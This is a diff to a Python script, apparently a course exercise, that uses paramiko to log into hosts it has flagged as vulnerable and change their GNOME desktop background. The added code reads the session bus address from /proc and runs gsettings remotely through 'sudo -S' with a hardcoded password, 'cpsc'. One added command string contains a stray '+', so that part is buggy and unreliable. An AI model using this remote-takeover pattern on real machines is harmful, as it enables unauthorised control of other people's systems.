@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 import socket
-import os
+import os, re
 import sys, time
 import datetime
 import paramiko
@@ -97,7 +97,7 @@ def get_vulnerable_hosts(port):
 	return vulnerable_hosts
 
 
-def set_background(ssh):
+def set_background(ssh, host):
 	""" Downloads a new desktop background for remote system """
 	
 	# Get the files in the user's home folder
@@ -124,11 +124,33 @@ def set_background(ssh):
 		#print (stdout.readlines())
 		#print (stderr.readlines())
 		# Following command works when run manually on target machine, but not through ssh
-		prefix = "echo '" + remote_password + "' | sudo -S "
-		cmd = "gsettings set org.gnome.desktop.background picture-uri file:///$PWD/" + image_name
-		stdin, stdout, sterr = ssh.exec_command(prefix + cmd)
+		print ("tying for pid")	
+		stdin,stdout,stderr = ssh.exec_command("echo pid=$(pgrep gnome-session)")
+		#print (stdout.readlines())
+		#print (stdout.readlines())
+		#print (stdout.readlines())	
+		#print (sys.__stdout_)
+		pid = stdout.readlines()[0][4:8]
+		print ("pid is: " + pid)
+
+		sudo_prefix = "echo 'cpsc\n' + | sudo -S "
+		stdin,stdout,stderr = ssh.exec_command(sudo_prefix + "export DBUS_SESSION_BUS_ADDRESS=$(grep -z DBUS_SESSION_BUS_ADDRESS /proc/" + pid + "/environ | cut -d= -f2-) && " + sudo_prefix + "gsettings set org.gnome.desktop.background picture-uri \"file://" + home_dir + image_name + "\"")
+		#print ("export dbus...")
+		#print (stdout.readlines())
+		#print (stderr.readlines())
+		#stdin,stdout,stderr = ssh.exec_command(
+		#sudo_prefix + "gsettings set org.gnome.desktop.background picture-uri \"file://" + home_dir + image_name + "\"")
+		print ("gsettings...")
 		print (stdout.readlines())
 		print (stderr.readlines())
+
+
+		#prefix = "echo '" + remote_password + "' | sudo -S "
+		#cmd = "gsettings set org.gnome.desktop.background picture-uri file:///$PWD/" + image_name
+		#stdin, stdout, sterr = ssh.exec_command(prefix + cmd)
+		# No output from these either
+		# print (stdout.readlines())
+		# print (stderr.readlines())
 		time.sleep(14)
 	except:
 		print("Error with setting gnome desktop background\n")
@@ -210,7 +232,7 @@ if __name__ == "__main__":
 
 		# Try changing the background on remote host
 		try:
-			set_background(ssh)
+			set_background(ssh, host)
 		except Exception as e:
 			print ("%s[!] Error setting desktop background\n" % (offset))
 			pass
